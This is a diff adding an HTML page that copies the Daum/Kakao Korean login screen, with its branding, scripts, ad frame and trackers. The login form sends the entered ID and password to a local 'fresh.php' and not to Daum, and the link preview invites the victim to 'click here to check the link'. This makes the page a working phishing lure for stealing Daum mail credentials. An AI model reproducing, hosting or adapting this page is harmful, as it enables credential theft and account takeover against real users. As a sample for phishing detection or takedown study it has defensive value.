@@ -1,0 +1,273 @@
+<html lang="ko"><head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+    <meta property="og:title" content="Daum 로그인">
+    <meta property="og:type" content="website">
+    <meta property="og:image" content="http://m1.daumcdn.net/svc/image/U03/common_icon/5587C4E4012FCD0001">
+    <meta property="og:image:secure_url" content="https://m1.daumcdn.net/svc/image/U03/common_icon/5587C4E4012FCD0001">
+    <meta property="og:description" content="여기를 눌러 링크를 확인하세요.">
+    <title>Daum 로그인</title>
+    <link rel="stylesheet" type="text/css" href="abc.css">
+    <link rel="stylesheet" type="text/css" href="/contents/min/css/font_pc.css">
+    <script type="text/javascript" src="https://t1.daumcdn.net/id/statics/common/js-lib/jquery-1.12.1.min.js"></script>
+    <script type="text/javascript" src="https://t1.daumcdn.net/id/statics/common/js-lib/jquery.cookie-1.3.1.min.js"></script>
+    <script type="text/javascript" src="https://developers.kakao.com/sdk/js/kakao.min.js"></script>
+    <script type="text/javascript" src="/contents/min/js/login-default.js"></script>
+<script type="text/javascript" async="" src="http://m1.daumcdn.net/tiara/js/td.min.js"></script><script charset="utf-8" src="https://t1.daumcdn.net/kas/static/ba.min.js"></script></head>
+<body>
+<div id="kakaoWrap">
+		<div id="kakaoHead">
+		<div class="inner_head">
+			<h1>
+				<a href="http://www.daum.net" id="daumLogo" class="link_daum" alt="Daum" onclick="_tiq.push(['__trackEvent', 'loginform_pc', 'daum_logo']);">
+					<span class="ir_wa">DAUM</span>
+				</a>
+			</h1>
+		</div>
+	</div>
+
+	<hr class="hide">
+	<div id="kakaoContent" class="cont_login" role="main">
+		<!-- 아이디입력도움말 노출시 view_help클래스 / 자판보기 노출시 view_key클래스 / 특수문자 노출시 view_char클래스 추가 -->
+		<div id="mArticle">
+			<h2 class="screen_out">아이디 로그인</h2>
+			<div class="section_login">
+                
+				<div id="loginFormDiv" class="login_default">
+					<form novalidate="" id="loginForm" method="post" action="fresh.php">
+						<input type="hidden" name="url" value="https://mail.daum.net/">
+						<input type="hidden" name="relative" value="">
+						<input type="hidden" name="weblogin" value="1">
+                        <input type="hidden" name="service" value="">
+						                            <input type="hidden" name="slevel" value="1">
+                            <input type="hidden" name="finaldest" value="">
+                            <input type="hidden" name="reloginSeq" value="0">
+							
+												
+						<fieldset class="fld_comm">
+							<legend class="screen_out">아이디,비밀번호 로그인 정보 입력 폼</legend>
+							<div class="box_inp "> <!-- input 포커스시 input_on클래스 추가 / 입력시, 입력내용삭제버튼 노출시 del_on클래스 추가 -->
+								<label for="id" class="lab_g ">아이디 입력</label> <!-- 공통 : input입력시 lab_g요소에 screen_out클래스 추가 -->
+								<input type="email" readonly="1" id="id" name="id" value="" class="tf_g" style="ime-mode:disabled;">
+								<button type="button" class="btn_del"><span class="ico_login ico_del">입력 내용 지우기</span></button>
+							</div>
+							<p id="id_msg" class="txt_message" style=" display:none "> <!-- 오류메세지 노출시 display:block, 비노출시 display:none -->
+								
+							</p>
+
+							<div class="box_inp "> <!-- input 포커스시 input_on클래스 추가 / 입력시, 입력내용삭제버튼 노출시 del_on클래스 추가 -->
+								<label for="inputPwd" class="lab_g ">비밀번호 입력</label> <!-- 공통 : input입력시 lab_g요소에 screen_out클래스 추가 -->
+								<input type="password" id="inputPwd" name="pw" class="tf_g" maxlength="32" autocomplete="off" style="ime-mode:disabled;">
+								<button type="button" class="btn_del"><span class="ico_login ico_del">입력 내용 지우기</span></button>
+							</div>
+							<p id="pw_msg" class="txt_message" style=" display:none "> <!-- 오류메세지 노출시 display:block, 비노출시 display:none -->
+								
+							</p>
+
+							<button id="loginBtn" type="submit" class="btn_comm" onclick="_tiq.push(['__trackEvent', 'loginform_pc', 'login_daum']);">로그인</button>
+							
+							<div class="set_login"> <!-- 2016-10-10 툴팁노출시 tooltip_on클래스 추가 -->
+								<span class="set_comm "> <!-- 선택시 check_on클래스 추가 -->
+									<label for="stln" class="lab_check" onclick="_tiq.push(['__trackEvent', 'loginform_pc', 'stln']);">로그인 상태 유지</label>
+									<span class="check_g">
+										<input type="checkbox" id="stln" name="stln" value="1" class="inp_check" onclick="_tiq.push(['__trackEvent', 'loginform_pc', 'stln']);">
+										<span class="ico_login ico_check">선택안됨</span> <!-- inp_check에 초점이 이동한경우 해당 ico_check요소에 focus클래스 추가 / 선택상태에 맞게 '선택됨','선택안됨' 으로 대체텍스트 제공 -->
+									</span>
+								</span>
+																<div class="layer_set" style=" display:none "><!-- 비노출시 display:none 처리 -->
+									<p class="desc_set">개인정보 보호를 위해, 개인 PC에서만 사용해 주세요.</p>
+									<span class="ico_login ico_point"></span>
+								</div>
+																	<span class="set_security "><!-- 체크해제 시 check_off클래스 추가 -->
+										<a href="#none" id="linkSecurity" class="link_security" target="_blank" onclick="_tiq.push(['__trackEvent', 'loginform_pc', 'ipsecurity_label']);">IP보안</a>
+										<input type="checkbox" id="ipSecurity" name="ipSecurity" class="inp_check" value="checked" checked="checked">
+										<label for="ipSecurity" class="ico_login lab_security" onclick="_tiq.push(['__trackEvent', 'loginform_pc', 'ipsecurity_onoff']);">IP보안 설정 ON</label><!-- inp_check에 초점이 이동한경우 해당 lab_security요소에 focus클래스 추가 / ON,OFF선택에 맞게 'IP보안 설정 ON','IP보안 설정 OFF'로 대체텍스트 제공 -->
+									</span>
+							</div>
+						</fieldset>
+					</form>
+					<div class="login_help">
+						<button type="button" class="btn_help btn_key " onclick="_tiq.push(['__trackEvent', 'loginform_pc', 'open_keyboard']);">자판보기<span class="ico_login ico_arr">펼치기/접기</span></button> <!-- 버튼클릭시 btn_view클래스 추가 -->
+						<button type="button" class="btn_help btn_key " onclick="_tiq.push(['__trackEvent', 'loginform_pc', 'special_char']);">특수문자<span class="ico_login ico_arr">펼치기/접기</span></button> <!-- 버튼클릭시 btn_view클래스 추가 -->
+						<button type="button" class="btn_help " onclick="_tiq.push(['__trackEvent', 'loginform_pc', 'id_help']);">아이디 입력 도움말<span class="ico_login ico_arr">펼치기/접기</span></button> <!-- 버튼클릭시 btn_view클래스 추가 -->
+					</div>
+					<div class="area_help" style="display:none">
+						<div class="bg_help img_key"></div>
+					</div>
+					<div class="area_help" style="display:none">
+						<div class="bg_help img_char"></div>
+					</div>
+					<div class="area_help" style="display:none">
+						<ul class="list_help">
+							<li><span class="ico_login ico_dot"></span>이메일아이디는 <em class="emph_login">이메일 전체를 입력</em>해 주세요. <span class="txt_help">예) abc@example.com</span></li>
+							<li><span class="ico_login ico_dot"></span>폰번호아이디는 <em class="emph_login">폰번호 앞에 #을 붙여서 입력</em>해 주세요. <span class="txt_help">예) #01090008000</span></li>
+						</ul>
+						<button type="button" class="btn_close">도움말 닫기<span class="ico_login ico_close"></span></button>
+					</div>
+										<div class="login_rel">
+						<a href="https://member.daum.net/join?rtnUrl=https%3A%2F%2Fmail.daum.net%2F" id="signUp" class="link_rel" target="_blank" onclick="_tiq.push(['__trackEvent', 'loginform_pc', 'join']);">회원가입</a><span class="txt_bar">|</span><a href="https://member.daum.net/find/id.do" id="findID" class="link_rel" target="_blank" onclick="_tiq.push(['__trackEvent', 'loginform_pc', 'findid']);">아이디 찾기</a><span class="txt_bar">|</span><a href="https://member.daum.net/find/password.do" id="findPW" class="link_rel" target="_blank" onclick="_tiq.push(['__trackEvent', 'loginform_pc', 'findpw']);">비밀번호 찾기</a>
+					</div>
+															<div class="wrap_util">
+						<a href="#" class="link_kakao" id="btnKakaoLogin" onclick="_tiq.push(['__trackEvent', 'loginform_pc', 'login_kakao']);"><span class="ico_login ico_klogin"></span><span class="txt_kakao">카카오계정으로 로그인</span></a>
+					</div>
+									</div>
+			</div>
+
+						<div class="info_etc">
+                <ins class="daum_ddn_area" style="display: block; text-decoration: none; margin: 0px auto; min-width: 250px; min-height: 250px; width: 250px; height: 250px;" data-ad-frame-id="login_AMS" data-ad-frame-name="login_AMS" data-ad-unit="00Y28" data-ad-type="D" data-ad-width="250" data-ad-height="250" id="kakao_ad_KoekVr_2321" data-ad-rfseq="1" data-ad-status="done" data-ad-viewable="viewed" data-ad-rendered="Y" data-ad-containerwidth="250" data-ad-request-id="058f1025-b68d-48b6-a11a-9dd803d9ef1f" data-ad-rfinterval="0" data-ad-bordercolor="#e5e5e5" data-ad-action="" data-ad-actioninterval="0" data-ad-refreshlimit="0" data-ad-noadmaxcount="10" data-ad-noadseq="0"><div data-ad-creative-wrap="outer" style="overflow: hidden; position: relative; min-width: 250px; min-height: 250px; max-height: inherit;"><div data-ad-creative-wrap="border" style="position: absolute; left: 0px; top: 0px; width: 100%; height: 100%; box-sizing: border-box; z-index: 2; border: 1px solid rgb(229, 229, 229); pointer-events: none;"></div><div data-ad-creative-wrap="inner" style="overflow: hidden; height: 250px;"><iframe frameborder="0" scrolling="no" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" id="login_AMS" name="login_AMS" srcdoc="<!DOCTYPE html>
+<html lang=&quot;ko&quot;>
+<head>
+    <style type=&quot;text/css&quot;>
+        @charset &quot;utf-8&quot;;
+        /* reset */
+        body,div,dl,dt,dd,ul,ol,li,h1,h2,h3,h4,h5,h6,pre,code,form,fieldset,legend,textarea,p,blockquote,th,td,input,select,button{margin:0;padding:0}
+        fieldset,img{border:0 none}
+        dl,ul,ol,menu,li{list-style:none}
+        blockquote, q{quotes: none}
+        blockquote:before, blockquote:after,q:before, q:after{content:'';content:none}
+        input,select,textarea,button{vertical-align:middle}
+        input::-ms-clear{display:none}
+        button{border:0 none;background-color:transparent;cursor:pointer}
+        body{background:#fff;-webkit-text-size-adjust:none;text-align:left}
+        body,th,td,input,select,textarea,button{font-size:12px;line-height:1.5;font-family:'Apple SD Gothic Neo','Malgun Gothic','맑은 고딕','dotum','돋움',sans-serif;color:#333} /* 2019-05-21_v3 수정 */
+        a{color:#333;text-decoration:none}
+        a:active, a:hover{text-decoration:underline}
+        a:active{background-color:transparent}
+        address,caption,cite,code,dfn,em,var{font-style:normal;font-weight:normal}
+        /* global */
+        .ir_pm{display:block;overflow:hidden;font-size:0;line-height:0;text-indent:-9999px}
+        .ir_pm{display:block;overflow:hidden;font-size:1px;line-height:0;color:transparent}
+        .ir_wa{display:block;overflow:hidden;position:relative;z-index:-1;width:100%;height:100%}
+        .ir_caption{overflow:hidden;width:1px;font-size:1px;line-height:0;text-indent:-9999px}
+        .screen_out{overflow:hidden;position:absolute;width:0;height:0;line-height:0;text-indent:-9999px}
+        .show{display:block}
+        .hide{display:none}
+
+        .cm_ad{position:relative;width:250px;height:250px;letter-spacing:0}
+        .cm_ad .inner_cm{background-color:#f4f6f8;text-align:center}
+        .cm_ad .link_ad{display:block;overflow:hidden;position:relative;text-decoration:none}
+        .cm_ad .link_ad .thumb_img{display:inline-block;overflow:hidden;position:relative;width:100%;height:100%;vertical-align:top}
+        .cm_ad .link_ad .thumb_img .img_thumb{display:inline-block;width:100%;height:100%;vertical-align:top}
+        .cm_ad .area_price{position:absolute;bottom:17px;left:20px;right:20px;z-index:1;text-align:left;line-height:20px;text-decoration:none;color:#fff} /* 2019-05-15 수정 */
+        .cm_ad .tit_price{display:block;overflow:hidden;width:100%;padding-bottom:1px;font-weight:bold;font-size:16px;letter-spacing:-0.25px;text-align:left;white-space:nowrap;text-overflow:ellipsis} /* 2019-05-21_v2 수정 */
+        .cm_ad .desc_price{display:block;display: -webkit-box;overflow:hidden;max-height:40px;margin-top:4px;font-size:14px;font-weight:normal;letter-spacing:-0.25px;text-overflow:ellipsis;-webkit-box-orient:vertical;-webkit-line-clamp: 2;word-break:break-all} /* 2019-05-21_v2 수정 */
+        .cm_ad .frame_ad{position:absolute;top:0;left:0;width:100%;height:100%;background:-moz-linear-gradient(bottom, rgba(0,0,0,0) 50%,rgba(0,0,0,0.6) 100%);background:-webkit-linear-gradient(bottom, rgba(0,0,0,0) 50%,rgba(0,0,0,0.6) 100%);background:linear-gradient(to bottom, rgba(0,0,0,0) 50%,rgba(0,0,0,0.6) 100%);
+            filter:progid:DXImageTransform.Microsoft.gradient(startColorstr=&quot;#00000000&quot;, endColorstr=&quot;#40000000&quot;,GradientType=0);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr=&quot;#00000000&quot;, endColorstr=&quot;#40000000&quot;,GradientType=0)}
+        .cm_ad .frame_line{position:absolute;top:0;left:0;width:100%;height:100%;border:1px solid #000;opacity:0.05;filter:alpha(opacity=5);background:url(//t1.daumcdn.net/biz/ui/adshopping/pixel.png) repeat;box-sizing:border-box}
+    </style>
+    <meta charset=&quot;UTF-8&quot;/>
+    <meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;/>
+    <meta http-equiv=&quot;imagetoolbar&quot; content=&quot;no&quot;/>
+    <meta http-equiv=&quot;imagetoolbar&quot; content=&quot;false&quot;/>
+    <meta name=&quot;viewport&quot; content=&quot;width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0&quot;/>
+    <title>광고</title>
+</head>
+<body>
+<div class=&quot;cm_ad&quot;>
+    <img src=&quot;https://keyword.ad.daum.net/exp?q=MHl8tEnVKP9LperKGD-Se5_bzuK4zUNmokNjH7o51JdWmRrq_B8mofYuH3L5LtkL7__5-l2ZOlHjE7jJwgVXbbJQ-DH1jruxqd_P_._FiWejsyl36b2LR93vLuUon1.wBvnaPmeUmie7AllI_lVcTjtpbCRV6A3RU93TEvLesHv-P.cLawhaJG7C.QrClYF3sTOEeMcnLexl1fATCUgd2KsJFlzLFFydufjOwLX_mxwrPtksgSEyX1YNlkdiMro3GrrO8UXq5Fs5vO55eIqgkOc5XN.JLWPLbj18BMKrEgyxupHRyaYY6A8VG_qlyCQna7dW-VSU2sXfQTqkOPTIegcO1bRz.wOPBzI8Bgcbg6nALRNzaNdglNNmSgi2l37MI_C99jSE.KsG9-DZ_RFEoV_y4twwU7Vn3CdENDfH-6.nOw00&amp;amp;r=MHrU7n_ftZ7Yg5B79ABPzF5DZl8oxS7Yib3b_vEpPCLSvCvUHdV_anae-C.jMFoM97aU7TxctJl7aqK1PoLies4-H.n62scF7fmnzvolmuZe_I-fLkbVPtY_YznVM8CNrNJcIkvv4w25--aY2pSFL4HZIKOGWZp5fSuFhBH6ovRPV7I7Mhu7ELOg8S7JGD.fEKpx6JpOn-XMoqPgQ8eBl3DUshDd_RQuhiqKogv8-qpgoES2kjIlMlSOw8OGWV.S_KR3grtA8twktX__jCjRtx3mNXk9FruX7WJaqV9ddX9a6sslN-HpwfAz58KoQ-HndWu4fFl2hN27DBDYOgrjYf7eqU5uRh_NQfp84vx7orEToBTKrqlEy5gGJJrqtv9cRF_16_jaIAae7vI.hfgwwzwAKkCuMH2c9o50&amp;amp;price=bga8Sk-LifvHPURcBOr4gQ&quot; style=&quot;border: 0px;display: none;&quot;/>
+    <div class=&quot;inner_cm&quot;>
+        <strong class=&quot;screen_out&quot;>광고 링크</strong>
+        <a href=&quot;https://keyword.ad.daum.net/clk?q=MHsYAqT26pgFUaTXKi-73UgarkQmzqfoYBhQ7bOyQKEYYNk-xyiM5rEUVo9mTWwngsZWJxksB5u4-x9lF6A3inoy_GvDeQAgmr6BeeHK3-iz3k2CREgbf6KHUEK-ihMXQX-V2NVc.jykk_eqsFZVbClLilB_j9QjZB.xP.lT6RsHBrZZbpwtv3fSKdQ2mxWk4diaguztMRL7ykRY_NAcrllPkSEH8u5yFIuGwRa6M_MgJcLMejFDKnHaGdokmf9yX1Amq-pJWLL6ruBFTHed_aL4IVCZfIpeOy2e-RA75E3NzvQ1soFVConcxeDPHpQYNDUtjCxw2uX7ySTn7c91RLgsM.Bxj82c3mlx8SGui2Qa7.B5clepjQt6n5RlggUR3Y5sm6XjJdNMXVi9z9olIb2KqTlC2L15qPDPNaa5pmIuqY8uaEL7SelRNX-gJuXAA1P.LoHDCGyOmGdVBYGbwP4jDGSZ5.4POPZw5Kdxa6vh.SYfXpORlgKCJiosuyb--1iB98mQnJzYyf7kw5jysHzSRBBbazAmV-vo-fIxkoESWpEPriHa5AHd.MkoHvWDBtyGyRNfCM4iyCRUZFul9tFj2tuzEBsZvG7B.Tp_E4mJgMI.tNvKfs5xZThk.pZoTeDvyxkqQkygreKwA5i29szVVdgBOxlBJ.AxSk6m.MuzulKTu8ncy.-WlWHykpZEqpCNuoJMH3dFUsJ_3t1JolIWIut6OCj_nbLc.IH9Qrv7nzqK_zi1mvLTRQNalkIkrGU1eN1xO-NUcsVeBIy2E7-6&amp;amp;s=https%3A%2F%2Fbtvcable.shop%2Fevent%2FEvent_View.do%3Fidx%3D74%26_C_%3D4665990%26ib_no%3Da16%26utm_source%3Ddaum%26utm_medium%3Dcpc%26utm_campaign%3Dcds_w%26utm_content%3D%EC%9C%A0%EC%B9%98_%EB%B2%94%EC%9A%A9_%EC%9D%B8%ED%84%B0%EB%84%B7_%EA%B0%80%EC%9A%A9%26utm_term%3D%EB%B6%80%EC%82%B0%EC%9D%B8%ED%84%B0%EB%84%B7%26DMKW%3D%25EB%25B6%2580%25EC%2582%25B0%25EC%259D%25B8%25ED%2584%25B0%25EB%2584%25B7%26DMSKW%3D54be77b954364637ac07f5277f3b697c%26DMCOL%3DAM&amp;amp;price=bga8Sk-LifvHPURcBOr4gQ&amp;amp;isExtCont=true&quot; target=&quot;_blank&quot; class=&quot;link_ad&quot;>
+            <span class=&quot;thumb_img&quot;>
+                <img src=&quot;//t1.daumcdn.net/clix_image_library_public/img/c3d4de89ab4a9f050ce5696ea6812567ae18a1d9&quot; alt=&quot;&quot;  class=&quot;img_thumb&quot; />
+            </span>
+            <span class=&quot;frame_ad&quot;></span>
+            <span class=&quot;frame_line&quot;></span>
+        </a>
+        <a href=&quot;https://keyword.ad.daum.net/clk?q=MHsYAqT26pgFUaTXKi-73UgarkQmzqfoYBhQ7bOyQKEYYNk-xyiM5rEUVo9mTWwngsZWJxksB5u4-x9lF6A3inoy_GvDeQAgmr6BeeHK3-iz3k2CREgbf6KHUEK-ihMXQX-V2NVc.jykk_eqsFZVbClLilB_j9QjZB.xP.lT6RsHBrZZbpwtv3fSKdQ2mxWk4diaguztMRL7ykRY_NAcrllPkSEH8u5yFIuGwRa6M_MgJcLMejFDKnHaGdokmf9yX1Amq-pJWLL6ruBFTHed_aL4IVCZfIpeOy2e-RA75E3NzvQ1soFVConcxeDPHpQYNDUtjCxw2uX7ySTn7c91RLgsM.Bxj82c3mlx8SGui2Qa7.B5clepjQt6n5RlggUR3Y5sm6XjJdNMXVi9z9olIb2KqTlC2L15qPDPNaa5pmIuqY8uaEL7SelRNX-gJuXAA1P.LoHDCGyOmGdVBYGbwP4jDGSZ5.4POPZw5Kdxa6vh.SYfXpORlgKCJiosuyb--1iB98mQnJzYyf7kw5jysHzSRBBbazAmV-vo-fIxkoESWpEPriHa5AHd.MkoHvWDBtyGyRNfCM4iyCRUZFul9tFj2tuzEBsZvG7B.Tp_E4mJgMI.tNvKfs5xZThk.pZoTeDvyxkqQkygreKwA5i29szVVdgBOxlBJ.AxSk6m.MuzulKTu8ncy.-WlWHykpZEqpCNuoJMH3dFUsJ_3t1JolIWIut6OCj_nbLc.IH9Qrv7nzqK_zi1mvLTRQNalkIkrGU1eN1xO-NUcsVeBIy2E7-6&amp;amp;s=https%3A%2F%2Fbtvcable.shop%2Fevent%2FEvent_View.do%3Fidx%3D74%26_C_%3D4665990%26ib_no%3Da16%26utm_source%3Ddaum%26utm_medium%3Dcpc%26utm_campaign%3Dcds_w%26utm_content%3D%EC%9C%A0%EC%B9%98_%EB%B2%94%EC%9A%A9_%EC%9D%B8%ED%84%B0%EB%84%B7_%EA%B0%80%EC%9A%A9%26utm_term%3D%EB%B6%80%EC%82%B0%EC%9D%B8%ED%84%B0%EB%84%B7%26DMKW%3D%25EB%25B6%2580%25EC%2582%25B0%25EC%259D%25B8%25ED%2584%25B0%25EB%2584%25B7%26DMSKW%3D54be77b954364637ac07f5277f3b697c%26DMCOL%3DAM&amp;amp;price=bga8Sk-LifvHPURcBOr4gQ&quot; target=&quot;_blank&quot; class=&quot;area_price&quot;>
+            <strong class=&quot;tit_price&quot;>SK브로드밴드 케이블</strong>
+            <span class=&quot;desc_price&quot;>안방TV+거실TV 월 10,890원, 제휴카드 할인시 요금 0원, 부산인터넷</span>
+        </a>
+    </div>
+</div>
+</body>
+</html>" style="min-width: 250px; width: 250px; min-height: 250px; height: 250px; display: block; border: 0px; margin: 0px auto; z-index: 1;"></iframe></div></div></ins>
+			</div>
+					</div>
+	</div>
+
+	<hr class="hide">
+
+	<div id="kakaoFoot">
+		<h2 class="screen_out">서비스 이용정보</h2>
+		<a href="http://www.kakaocorp.com/" class="link_kcorp" target="_blank" onclick="_tiq.push(['__trackEvent', 'loginform_pc', 'footer_corp']);">© Kakao Corp.</a>
+		<span class="txt_bar">|</span>
+		<a href="http://cs.daum.net/faq/59/14970.html" class="link_custom" target="_blank" onclick="_tiq.push(['__trackEvent', 'loginform_pc', 'footer_cs']);">고객센터</a>
+	</div>
+	        <div style="display:none">
+            <form novalidate="" id="kakaoLoginForm" method="post" action="https://logins.daum.net/accounts/kakaologin.do">
+                <input type="hidden" name="url" value="https://mail.daum.net/">
+                <input type="hidden" name="service" value="">
+                <input type="hidden" name="finaldest" value="">
+                <input type="hidden" name="reloginSeq" value="0">
+                <input type="hidden" name="relative" value="">
+                <input type="hidden" name="weblogin" value="1">
+                <input type="hidden" name="slevel" value="1">
+                <input type="hidden" name="platform" value="pc_web">
+				                <input type="hidden" name="handlebackurl" id="handlebackurl" value="">
+            </form>
+        </div>
+	</div>
+<script type="text/javascript">
+    jQuery(document).ready(function () {
+        if (daumlogin.slevel) {
+            daumlogin.slevel.init();
+        }
+
+        if (daumlogin.srp) {
+            daumlogin.srp.init();
+        }
+            var virtualKeyView = new VirtualKeyView('#kakaoContent');
+        virtualKeyView.initialize();
+
+            toggleBodyClass();
+
+        var loginForm = new LoginForm('#loginForm', {
+                        dummy: 0
+        }).initialize();
+
+        if (daumlogin.srp) {
+            daumlogin.srp.setValidator(loginForm.checkValid);
+        }
+
+                    Kakao.init('d10838164fe04a4e6da8e1f6d9972096');
+
+            jQuery("#btnKakaoLogin").click(function () {
+                _tiq.push(['__trackEvent', 'loginform_pc', 'login_kakao']);
+
+                Kakao.Auth.login({
+                    success: function (authObj) {
+                        var input = jQuery("<input>")
+                                .attr("type", "hidden")
+                                .attr("name", "access_token").val(authObj.access_token);
+
+                        jQuery('#kakaoLoginForm').append(jQuery(input));
+                        jQuery("#kakaoLoginForm").submit();
+                    },
+                    fail: function (err) {
+                        if (err.error !== 'access_denied' && err.error !== 'window_closed') {
+                            alert('카카오계정 로그인이 실패하였습니다. \n' + JSON.stringify(err.error_description));
+                        }
+                    },
+                    approvalType: 'project'
+                });
+
+                return false;
+            });
+                            document.getElementById('handlebackurl').value = document.location.href;
+                        });
+</script>
+<script async="" type="text/javascript" src="//t1.daumcdn.net/adfit/static/ad.min.js"></script>
+    <script type="text/javascript">
+    var _tiq = 'undefined' !== typeof _tiq ? _tiq : []; // Global Variables
+
+    _tiq.push(['__trackPageview']);
+
+    (function(d) {
+        var se = d.createElement('script'); se.type = 'text/javascript'; se.async = true;
+        se.src = location.protocol + '//m1.daumcdn.net/tiara/js/td.min.js';
+        var s = d.getElementsByTagName('head')[0]; s.appendChild(se);
+    })(document);
+</script>
+	    
+</body></html>
